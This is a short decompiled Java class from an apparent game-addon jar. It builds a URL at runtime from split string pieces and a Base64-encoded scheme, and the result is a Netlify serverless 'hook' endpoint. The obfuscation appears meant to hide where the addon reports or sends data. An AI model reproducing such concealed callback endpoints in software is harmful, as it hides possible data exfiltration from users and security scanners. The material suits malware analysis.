package com.bassa.addon.modules;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

/* JADX INFO: loaded from: 1.jar:com/bassa/addon/modules/UrlObf.class */
public class UrlObf {
    private static final String C = "-664508";
    private static final String E = ".app";
    private static final String F = "/.netlify/functions/hook";
    private static final String A = new String(Base64.getDecoder().decode("aHR0cHM6Ly8="), StandardCharsets.UTF_8);
    private static final String B = "animated-horse";
    private static final String D = "netlify";

    public static String build() {
        return A + B + C + "." + D + E + F;
    }
}
